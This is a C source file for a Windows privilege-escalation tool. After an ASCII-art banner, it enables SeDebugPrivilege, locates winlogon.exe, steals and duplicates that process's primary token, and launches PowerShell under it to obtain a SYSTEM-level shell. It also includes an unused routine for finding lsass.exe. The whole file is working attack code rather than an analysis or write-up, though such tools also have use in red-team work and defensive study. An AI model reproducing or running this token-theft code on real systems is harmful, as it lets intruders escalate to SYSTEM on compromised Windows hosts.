#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Main.h"


#define STATUS_SUCCESS              0x00000000
#define STATUS_BUFFER_TOO_SMALL     0xC0000023

typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtOpenThreadToken)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);

HANDLE GetCurrentToken() {

    HANDLE                  hToken = NULL;
    NTSTATUS                STATUS = 0x00;
    fnNtOpenThreadToken     pNtOpenThreadToken = NULL;
    fnNtOpenProcessToken    pNtOpenProcessToken = NULL;

    if (!(pNtOpenThreadToken = (fnNtOpenThreadToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenThreadToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return NULL;
    }

    if (!(pNtOpenProcessToken = (fnNtOpenProcessToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenProcessToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return NULL;
    }

    if ((STATUS = pNtOpenThreadToken((HANDLE)-2, TOKEN_ALL_ACCESS, FALSE, &hToken)) != 0x00) {
        if ((STATUS = pNtOpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hToken)) != 0x00) {
            printf("[!] NtOpenProcessToken Failed With Error: 0x%0.8X \n", STATUS);
            hToken = NULL;
        }
    }

    return hToken;
}

BOOL GetTokenUserW(_In_ HANDLE hToken, _Out_ LPWSTR* szUsername) {
    BOOL                            bResult = FALSE;
    NTSTATUS                        STATUS = 0x00;
    PTOKEN_USER                     pTokenUser = NULL;
    SID_NAME_USE                    SidName = { 0 };
    fnNtQueryInformationToken       pNtQueryInformationToken = NULL;
    ULONG                           uReturnLength = 0x00,
        uUserLen = 0x00,
        uDomnLen = 0x00,
        uTotalLength = 0x00;
    PVOID                           pUserStr = NULL,
        pDomainStr = NULL;

    if (!hToken || !szUsername)
        return FALSE;

    if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, NULL, 0x00, &uReturnLength)) != STATUS_SUCCESS && STATUS != STATUS_BUFFER_TOO_SMALL) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        return FALSE;
    }

    if (!(pTokenUser = LocalAlloc(LPTR, uReturnLength))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationToken(hToken, TokenUser, pTokenUser, uReturnLength, &uReturnLength)) != STATUS_SUCCESS) {
        printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
        goto _END_OF_FUNC;
    }

    if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, NULL, &uUserLen, NULL, &uDomnLen, &SidName)) {

        SidName = 0x00;
        uTotalLength = (uUserLen * sizeof(WCHAR)) + (uDomnLen * sizeof(WCHAR)) + sizeof(WCHAR);

        if (!(*szUsername = (PSTR)LocalAlloc(LPTR, uTotalLength))) {
            printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
            goto _END_OF_FUNC;
        }

        pDomainStr = *szUsername;
        pUserStr   = (*szUsername) + uDomnLen;

        if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, pUserStr, &uUserLen, pDomainStr, &uDomnLen, &SidName)) {
            printf("[!] LookupAccountSidW Failed With Error: %d\n", GetLastError());
            goto _END_OF_FUNC;
        }

        (*szUsername)[uDomnLen] = L'\\';
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pTokenUser)
        LocalFree(pTokenUser);
    if (!bResult && *szUsername)
        LocalFree(*szUsername);
    return bResult;
}

BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {

    TOKEN_PRIVILEGES	TokenPrivs = { 0x00 };
    LUID				Luid = { 0x00 };

    if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    TokenPrivs.PrivilegeCount           = 0x01;
    TokenPrivs.Privileges[0].Luid       = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        return FALSE;
    }

    return TRUE;
}

/**
 * @brief
 *  steal primary token from
 *  specified process id 
 *
 * @param Pid
 *  process id to steal
 *  primary token from
 *
 * @return
 *  process primary token 
 */
HANDLE StealToken(_In_ ULONG Pid)
{
    HANDLE TokenHandle   = { 0 };
    HANDLE ProcessHandle = { 0 };

    if ((TokenHandle = GetCurrentToken())) {
        //
        // try to get the current token and adjust
        // the SeDebugPrivilege privilege to be enabled 
        //
        if (SetPrivilege(TokenHandle, L"SeDebugPrivilege")) {
            puts("[+] SeDebugPrivilege enabled");
        }
        CloseHandle(TokenHandle);
        TokenHandle = NULL;
    }

    //
    // open a handle to the process id
    // to steal the primary token from
    //
    if (!(ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid))) {
        printf("[-] OpenProcess Failed with Error: %lx\n", GetLastError());
        goto _END_OF_FUNC;
    }

    //
    // open a handle to the primary access
    // token from the specified process handle 
    //
    if (!OpenProcessToken(ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle)) {
        printf("[-] OpenProcessToken Failed with Error: 0x%lx\n", GetLastError());
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (ProcessHandle) {
        CloseHandle(ProcessHandle);
    }
        
    return TokenHandle;
}



// Function to set the console text color
void setColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

int danny() {
    // Set color to bright yellow
    setColor(14);
    printf("-=========:::::::::::::=**+++=::-===+*+=====::-==-:::::::::=+++===::-===+*=::\n");
    printf("-@@@@@@@@@@-:====::====+@@@@@*--*@@@@@@*@@@@==*@@*=+******=+@@@@@*-:*@@@@@*::\n");
    printf("-+@@@@@@@@@@-@@@@:=@@@@=@@@@@*--*@@@@@*+*@@@=-*@@*=*@@@@@@++@@@@@@-:@@@@@@*::\n");
    printf("-=@@@@@@@@@@+*@@@:=@@@@=@@@@@@=-*@@@@@*+@@@*--*@@+=*@@@@@@=-@@@@@@=:@@@@@@=::\n");
    printf(":=@@@@*=@@@@*@@@@:-@@@@+@@@@@@+=@@@@@@*=*@@*-=*@@=-*@@*@@@*=@@@@@@==@@@@@@=::\n");
    printf(":-@@@@+=@@@@-=@@@:-@@@@=@@@@@@*=@@@@@@*-*@@*==*@@==*@@=*@@*-*@@@@@=+@@@@@@=::\n");
    printf("::*@@@@@@@@@-=@@@:-*@@@-*@@@@@*+@@@@@@*-+@@@@@@@@==@@@=*@@@=*@@+@@+*@@@@@@-::\n");
    printf("-:*@@@@@@@*-:=@@@:-*@@*=@@@*+@@@@@**@@*-=@@@@@@@@=-*@@*@@@@=*@@=*@@@@@+@@@=::\n");
    printf("::=@@@@@@@=::=@@@=-*@@@-*@@==@@@@@=+@@*-=@@+:-*@@==@@@@@@@@=*@@=+@@@@*-@@@-::\n");
    printf("::-@@@**@@*::-@@@*-"); setColor(9); printf(" *@@@-+@@"); setColor(14); printf("+-*@@@*-+@@*-=*@=::"); setColor(9); printf("+@@==@@@@@@@"); setColor(14); printf("@=*@@=:@@@@=:@@@=::\n");
    setColor(9);
    printf(":::*@@*-@@@-:-@@@@-@@@*:=@@*:=@@@*:=@@*=-*@=::-*@==@@*=+@@@=*@@=:*@@@-:@@@=::\n");
    printf(":::+@@*:+@@*::=@@@@@@@*:=@@+:=@@@*-=@@*-:*@=::-*@==@@=::*@@==@@-:=@@@=:*@@-::\n");
    printf(":::-==-::---:::=@@@@@=:::::::::-::::---:::::::::::=**-::=+=::::::::::::::::::\n");
    setColor(12);
    printf(":::::::::::::::::--:::::::::::::::-=***@@@**+-:::::::::::::::::::::::::::::::\n");
    printf(":::::::::::::::::::::::::::=*****@@@@@@@@@@@@@@*+=:::::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::-=*@@@@@@@@@@@@@@@@@@@@@@@@+-::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::=**@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-::::::::::::::::::::::\n");
    printf("::::::::::::::::::::-+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+==-:--:::::::::::::::\n");
    printf(":::::::::::::::::-*@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=::=@@@@@@=:::::::::::\n");
    printf("::::::::::::::::-**@@*=@@@@@@@@@@@@@@@@@@@@@@@@@@=:-=-::::::+@@*::::::::::::\n");
    printf(":::::::::::::::-@@@@*=@@@@@@@@@@@@@@@@@@@@@@@@@@+:::::::::-:::-=::::::::::::\n");
    printf(":::::::::::::::=@@@@=*@@@@@@@@@@@@@@@@@@@@@@@@@@+**=::::=@@=::::+=::::::::::\n");
    printf(":::::::::::::-*@@=-*=@@@@@@@@@@@@@@@@@@@@@@@@@@@***=:::+@*-:::::-==:::::::::\n");
    printf("::::::::::::-*@@@-::*@@@@@@@@@@@@@@@@@@@@@@@@@***+=*=::-=:::::::::=+-:::::::\n");
    printf("::::::::::::=@*:::::=@@@@@@@*+=--=+@@@@@@@@@*-::---::::::::::::::=@@@-::::::\n");
    printf("::::::::::::*@*:::::::=@@@@+*@@@@@@@@@@@@@@@=:*@@@@@*::::::::::::=@*-:::::::\n");
    printf("::::::::::::*@@*:::=-:::+@@@@@**@@@*=*@@@*-=@@@@*====::::::::*+-*-*+::::::::\n");
    printf(":::::::::::::=@@=::=*:::::-=*==**==-::-==-:::::::::+*+-::::::-::::::::::::::\n");
    printf("::::::::::::::+@@@*=+*=*=:::--=+==***@+:::::-=+*+=+--=::+=:::**-::::::::::::\n");
    printf("::::::::::::::=@@@*==@@@@==**@@@@@**@@*=*=::=@@*@*+*@@=::=-=-::*=:::::::::::\n");
    printf(":::::::::::::::=@@*==*@@@@***@@@@**@@@@@@@+=*****@@@@+=+=:--=*@*=:::::::::::\n");
    printf("::::::::::::::::=@@@*+@@@@@+@@@@@@@@@@@@@@@+*@@@@@@@+*=:::*+@@@@+:::::::::::\n");
    printf("::::::::::::::::::-==*@@@@@@@+=*@@*=*@@@@@@*=+*+=-:::::::+@@@@+-::::::::::::\n");
    printf(":::::::::::::::::::::-@@@@@@@@@@@@@@@=*@@*--=-*@@+::*@@@=-:-::::::::::::::::\n");
    printf(":::::::::::::::::::::-@@@@@@@@@@@**@@@@@@*++*@@@@*-+@@=:::::::::::::::::::::\n");
    printf("::::::::::::::::::::::=@@@@@@@@@@*@@@@@@@@@@@*=+*@=-=-::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::-*@@@@@@@@@@@@@@@@@@@@*=-=*@*-:::::::::::::::::::::::\n");
    printf(":::::::::::::::::::::::-*@@@@@@@@@***========--+@@*-:::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::-*@@@@@@@@*@@@@@@@@@*=::*@=::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::::-*@@@@@@@@*===+==--=-=@+:::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::::::-@@@@@@@@@@@@@@@@==*=::::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::::::::+@@@@@@@@@@@@@*=:::::::::::::::::::::::::::::\n");
    printf(":::::::::::::::::::::::::::::::-+=-*@@@**@*::::::::::::::::::::::::::::::::\n");
    printf("::::::::::::::::::::::::::::::::::::::::-::::::::::::::::::::::::::::::::::\n");
    printf(":::::::::::::::::::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::\n");
    setColor(7);
    return 0;
}




DWORD pid = 0;

void findWinlogonPID() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnap, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

DWORD lsasspid = 0;

void findLsassPID() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnap, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, L"lsass.exe") == 0) {
                lsasspid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}




int main()
{
    HANDLE              TokenHandle     = { 0 };
    HANDLE              DuplicateHandle = { 0 };
    LPWSTR              TokenUser       = { 0 };
    ULONG               ProcessId       = { 0 };
    PROCESS_INFORMATION ProcessInfo     = { 0 };
    STARTUPINFO         StartupInfo     = { 0 };

    danny();

    if ((TokenHandle = GetCurrentToken())) {
        if (GetTokenUserW(TokenHandle, &TokenUser)) {
            printf("[*] TokenUser is %ls\n", TokenUser);
           
        }

        if (TokenHandle) {
            CloseHandle(TokenHandle);
        }

        if (TokenUser) {
            LocalFree(TokenUser);
        }
    }

    // Get WinLogon deets

    findWinlogonPID();
  //  findLsassPID();

    ProcessId = pid;
    printf("[*] WinLogon PID is:%lu\n", pid);
    if ((TokenHandle = StealToken(ProcessId))) {
        printf("[*] Stole process token from %ld: 0x%x\n", ProcessId, TokenHandle);
    } else {
        puts("[-] Failed to steal token");
    }

    //
    // duplicate the stolen token and turn it into a primary token with
    // the security level to be impersonatable for CreateProcessWithTokenW 
    //
    if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateHandle)) {
        printf("DuplicateTokenEx Failed with Error: %lx\n", GetLastError());
        goto _END_OF_FUNC;
    }

    //
    // create a process using the duplicated token handle 
    //
   if (!CreateProcessWithTokenW(DuplicateHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" , NULL, 0, NULL, NULL, &StartupInfo, &ProcessInfo)) {
       printf("[-] CreateProcessWithTokenW Failed with Error: %lx\n", GetLastError());
       goto _END_OF_FUNC;
   }


    if (GetTokenUserW(TokenHandle, &TokenUser)) {
        printf("[*] TokenUser is %ls\n", TokenUser);
    }

    printf("[*] Started process (%ld) with token user %ls\n", ProcessInfo.dwProcessId, TokenUser);
    printf("[*] Waiting for process to exit...");

    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

_END_OF_FUNC:
    if (TokenHandle) {
        CloseHandle(TokenHandle);
    }

    if (ProcessInfo.hProcess) {
        CloseHandle(ProcessInfo.hProcess);
    }

    if (ProcessInfo.hThread) {
        CloseHandle(ProcessInfo.hThread);
    }

    if (DuplicateHandle) {
        CloseHandle(DuplicateHandle);
    }

    if (TokenUser) {
        LocalFree(TokenUser);
    }

    return 0;
}
